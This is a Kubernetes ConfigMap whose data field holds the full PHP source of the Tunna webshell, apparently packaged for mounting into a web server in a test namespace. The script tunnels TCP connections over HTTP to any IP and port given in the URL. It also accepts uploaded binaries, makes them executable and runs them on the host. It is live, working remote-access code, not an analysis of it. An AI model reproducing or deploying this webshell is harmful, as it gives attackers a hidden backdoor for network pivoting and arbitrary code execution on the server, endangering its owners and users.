{
    "apiVersion": "v1",
    "data": {
        "http2tcp.php": "\u003c?php\n//\n//Tunna PHP webshell v1.1a (c) 2014 by Nikos Vassakis\n//http://www.secforce.com / nikos.vassakis \u003cat\u003e secforce.com\n//\nif(!empty($_GET)){\n\tif(isset($_GET[\"proxy\"])){\t//if url parameter proxy is set\n\t\tclass messenger{\t\t//handles the communication between webserver and socket\n\t\t\tpublic $address = \"\";\n\t\t\tpublic $port;\n\t\t\tpublic $socket;\n\t\t\tpublic $met_data = \"\";\n\t\t\tpublic $handler_data = \"\";\n\t\t\t\n\t\t\tfunction __construct($port,$ip){\t//Initialises socket values\n\t\t\t\tif ($port != \"\"){\n\t\t\t\t\t$this-\u003eport=$port;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\t$this-\u003eport=4444;\n\t\t\t\t}\n\t\t\t\tif ($ip != \"\"){\n\t\t\t\t\t$this-\u003eaddress=$ip;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\t$this-\u003eaddress='127.0.0.1';\n\t\t\t\t}\n\t\t\t\t$this-\u003econnect_to_server();\n\t\t\t\t$this-\u003erun_loop();\n\t\t\t}\n\n\t\t\tpublic function __destruct()\t\t//Close the socket\n\t\t\t{\n\t\t\t\tsocket_close($this-\u003esocket);\n\t\t\t}\n\t\t\t\n\t\t\tfunction connect_to_server()\t\t//Create and commect to socket\n\t\t\t{\n\t\t\t\t/* Create a TCP/IP socket. */\n\t\t\t\t$this-\u003esocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n\t\t\t\tif ($this-\u003esocket === false) {\texit (\"[Server] Unable to create socket\");\t}\n\t\t\t\t\n\t\t\t\t$result = @socket_connect($this-\u003esocket, $this-\u003eaddress, $this-\u003eport);\n\t\t\t\t\n\t\t\t\tif ($result === false) { exit (\"[Server] Unable to connect to socket\");\t}\n\t\t\t\t\n\t\t\t\tsocket_set_nonblock($this-\u003esocket);\t//Socket in non-blocking mode because of the consecutive HTTP requests\n\t\t\t\t\n\t\t\t\treturn $this-\u003esocket;\n\t\t\t}\n\t\t\t/*\n\t\t\t * Received data is written on the SESSION['handler_data']\n\t\t\t * There's a loop function (run_loop) that checks the SESSION variable for data and writes them to the socket\n\t\t\t * If there's data to be read from the socket the loop function puts them at the SESSION variable met_data\n\t\t\t * \n\t\t\t * At every request if there is data to be sent back they get send as a response\n\t\t\t * \n\t\t\t */\n\t\t\tpublic function update_session_data()\n\t\t\t{\n\t\t\t\t@session_start();\n\t\t\t\t\n\t\t\t\t$_SESSION['met_data'] .= $this-\u003emet_data;\n\t\t\t\t$this-\u003ehandler_data .= $_SESSION['handler_data'];\n\t\t\t\t$_SESSION['handler_data'] = \"\";\n\t\t\t\tsession_write_close();\n\t\t\t\t$this-\u003emet_data=\"\";\n\t\t\t}\n\n\t\t\tfunction run_loop(){\t//This will stall the thread / request\n\t\t\t\t$i=0;\n\t\t\t\twhile($_SESSION['running'] != -1){\n\t\t\t\t\t#read from local socket and put on session variable\n\t\t\t\t\twhile ($out = socket_read($this-\u003esocket, 8192)) {\n\t\t\t\t\t\tif($out === false){ exit(\"[Server] Unable to read from local socket\");\t}\n\t\t\t\t\t\t$this-\u003emet_data .= $out;\n\t\t\t\t\t}\n\t\t\t\t\t#If data on SESSION variable write data to local socket\n\t\t\t\t\tif ($this-\u003ehandler_data != \"\"){\t\n\t\t\t\t\t\t$in=socket_write($this-\u003esocket, $this-\u003ehandler_data, strlen($this-\u003ehandler_data));\n\t\t\t\t\t\tif($in === false){ exit(\"[Server] Unable to write to local socket\");\t}\n\t\t\t\t\t\t$this-\u003ehandler_data = \"\";\t\t\n\t\t\t\t\t}\n\t\t\t\t\t$this-\u003eupdate_session_data();\n\t\t\t\t\tif (!stristr(PHP_OS, \"linux\")){sleep(0.2);}\t//added to work with apache/IIS on windows otherwise the consecutive reads DoS the socket\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t//Report all errors\n\t\terror_reporting(E_ALL);\n\t\tini_set( 'display_errors','1');\n\t\tset_time_limit(0);\t\t//Time limit for request set to infinate for the loop function\n\t\t$ip=\"\";\n\t\t$port=\"\";\n\t\t$session_started=false;\n\t\t\n\t\ttry {\n\t\t\tif(session_start() === false){exit(\"[Server] Couldnt Start Session\");}\n\t\t} catch (Exception $e) {\n\t\t\t$_SESSION['running'] == 0;\n\t\t}\n\t\t\n\t\tif(isset($_GET[\"file\"])){\t//if url variable file is received\n\t\t\tif(isset($_GET[\"upload\"])){\t//read binary from request and write to temp dir\n\t\t\t\t$file = $_FILES[\"proxy\"];\n\t\t\t\tif ($file[\"error\"] \u003e 0 or empty($file)){\n\t\t\t\t\texit(\"[Server]: No File Selected\");\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\tif(move_uploaded_file($file[\"tmp_name\"], sys_get_temp_dir() . \"/\" . $file[\"name\"])){\n\t\t\t\t\t\techo \"[Server] File Uploaded at \" . sys_get_temp_dir() . \"/\" . $file[\"name\"];\t\n\t\t\t\t\t\t$_SESSION['file'] = sys_get_temp_dir() . \"/\" . $file[\"name\"];\n\t\t\t\t\t\texit();\n\t\t\t\t\t}\n\t\t\t\t\telse\t{\n\t\t\t\t\t\texit(\"[Server] Error Uploading File\");\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif(isset($_GET[\"close\"])){\t\t//if url parameter close is received the connection is closed\n\t\t\t$_SESSION['running'] = -1;\n\t\t\techo \"[Server] Closing the connection and killing the handler thread\";\n\t\t\tif(isset($_SESSION['pid'])){\n\t\t\t\techo \"\\n[Server] *Check that the socks process \".$_SESSION['pid'].\" is killed \";\n\t\t\t}\n\t\t\tif(isset($_SESSION['file'])){\n\t\t\t\tunlink($_SESSION['file']);\n\t\t\t}\n\t\t\texit();\n\t\t}\n\t\tif(isset($_GET[\"port\"])){\t\t//if port is specified in url connects to that port\n\t\t\t$port=$_GET[\"port\"];\n\t\t}\n\t\tif(isset($_GET[\"ip\"])){\t\t\t//if ip is specified in url connects to that ip\n\t\t\t$ip=$_GET[\"ip\"];\n\t\t}\n\n\t\tif (!isset($_SESSION['running'])) {\t//1st request: initiate the session\n\t\t\t$_SESSION['running'] = 0;\n\t\t\t$_SESSION['met_data'] = \"\";\n\t\t\t$_SESSION['handler_data'] = \"\";\n\t\t\t//Closing session_write otherwise next attempt to write to session will block\n\t\t\tsession_write_close();\n\t\t\tif (stristr(PHP_OS, \"linux\")){\t\t\n\t\t\t\techo \"[Server] All good to go, ensure the listener is working ;-)\\n[FILE]:[LINUX]\\n\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\techo \"[Server] All good to go, ensure the listener is working ;-)\\n[FILE]:[WIN]\\n\";\n\t\t\t}\n\t\t}\n\t\telse{\n\t\t\tif ($_SESSION['running'] == 0){\t//2nd request: get configuration options\n\t\t\t\t$_SESSION['running'] = 1;\n\t\t\t\tsession_write_close();\n\t\t\t/*\n\t\t\t * This will create a stalling thread for the loop function\n\t\t\t * that reads and writes data from the socket to the response \n\t\t\t * and from the request body to the socket\n\t\t\t * \n\t\t\t */\n\t\t\t \n\t\t\t if (isset($_SESSION['file'])){\n\t\t\t\t $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n\t\t\t\t //Get Random Port\n\t\t\t\t socket_bind($socket, 'localhost', 0);\n\t\t\t\t socket_getsockname($socket, $ip, $port);\n\t\t\t\t socket_close($socket);\n\t\t\t\t //Execute\n\t\t\t\t if (stristr(PHP_OS, \"linux\")){\t\t\n\t\t\t\t\texec(\"chmod +x \" . $_SESSION['file']);\t\t\t//if linux: need to make it an executable first\t\n\t\t\t\t}\n\t\t\t\t//start process \u0026 save pid\n\t\t\t\t//popen(\"start /B \". $_SESSION['file'], \"r\");\t//Execute in windows\n\t\t\t\t$proc=proc_open(($_SESSION['file'].\" \".$port),array(),$foo);\n\t\t\t\t$pid=proc_get_status($proc);\t\n\t\t\t\t$_SESSION['pid']=$pid['pid'];\n\t\t\t\techo \"[Server] Run \".$pid['pid'];\n\t\t\t\tsleep(2);\n\t\t\t }\n\t\t\t\t//connect\n\t\t\t\t$mymessenger = new messenger($port,$ip);\n\t\t\t}\n\t\t\telse{\t\n\t\t\t/* If session and socket are initialised\n\t\t\t * Read data from request body and update the SESSION var\n\t\t\t * \n\t\t\t * If data is on the SESSION var send them with the response\n\t\t\t */\n\t\t\t\theader('Content-Type: application/octet-stream');\n\t\t\t\t#write to buffer for server\n\t\t\t\t$_SESSION['handler_data'] .= file_get_contents(\"compress.zlib://php://input\");\n\t\t\t\t#read buffer for client\n\t\t\t\techo $_SESSION['met_data'];\n\t\t\t\t$_SESSION['met_data'] = \"\";\t//clear variable\n\t\t\t\tsession_write_close();\n\t\t\t}\n\t\t}\n\t}\n\telse{\n\t\techo \"Tunna v1.1a\"; //Version 1.1a\n\t}\n}\n?\u003e\n"
    },
    "kind": "ConfigMap",
    "metadata": {
        "creationTimestamp": null,
        "name": "connetc.php",
        "selfLink": "/api/v1/namespaces/jdg-test2/configmaps/connetc.php"
    }
}
